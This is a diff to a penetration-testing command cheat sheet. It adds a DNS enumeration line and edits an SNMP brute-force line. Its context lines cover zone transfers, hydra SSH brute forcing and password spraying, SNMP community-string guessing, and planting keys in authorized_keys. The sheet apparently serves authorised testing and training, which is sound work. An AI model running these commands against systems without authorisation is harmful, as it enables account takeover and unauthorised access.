@@ -96,6 +96,7 @@ WHOIS:whois <target> # Retrieve IP registration info. May reveal organization na
 WHOIS:whois <domain> # Retrieve domain registration details. Look for expiration dates; kali-machine
 
 DNS Enum:dig AXFR @<target> -p <port> <domain> # Attempt DNS zone transfer. If successful, you get all DNS records for the domain; kali-machine
+DNS Enum:dig ANY <domain> +noall +answer +additional #retrieve DNS records including additional sections; kali-machine
 DNS Enum:host -l <domain> <target> -p <port> # Alternative zone transfer attempt using host command; kali-machine
 DNS Enum:host -a <domain> <target> -p <port> # Host verbose/debug output; kali-machine
 DNS Enum:dnsrecon -d <domain> -t std,axfr,goo,bing,crtsh,snoop # Comprehensive DNS enumeration using multiple techniques; kali-machine
@@ -149,7 +150,7 @@ SSH:cat <filename1> >> ~/.ssh/authorized_keys # Manually append public key if yo
 SSH Brute:hydra -s <port> -l <user> -P <wordlist1> -t 10 <target> ssh # Brute force single user. Use when you have a username; kali-machine
 SSH Brute:hydra -s <port> -L <wordlist1> -p '<password>' -t 10 <target> ssh # Password spray one password against many users. Be careful of lockouts; kali-machine
 
-SNMP:onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt -i <target> # Brute-force SNMP community strings. Look for "public" or "private" responses; kali-machine
+SNMP:onesixtyone -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt <target> # Brute-force SNMP community strings. Look for "public" or "private" responses; kali-machine
 SNMP:snmpwalk -v1 -c public <target> # SNMP walk with public community. If successful, enumerate entire MIB tree; kali-machine
 SNMP:snmpwalk -v2c -c <community> <target> NET-SNMP-EXTEND-MIB::nsExtendOutputFull # Check for extended output. May reveal command execution results; kali-machine
 SNMP:sudo snmpbulkwalk -c <community> -v2c <target> NET-SNMP-EXTEND-MIB::nsExtendOutputFull # Bulk walk for extended MIB. Faster than snmpwalk; kali-machine
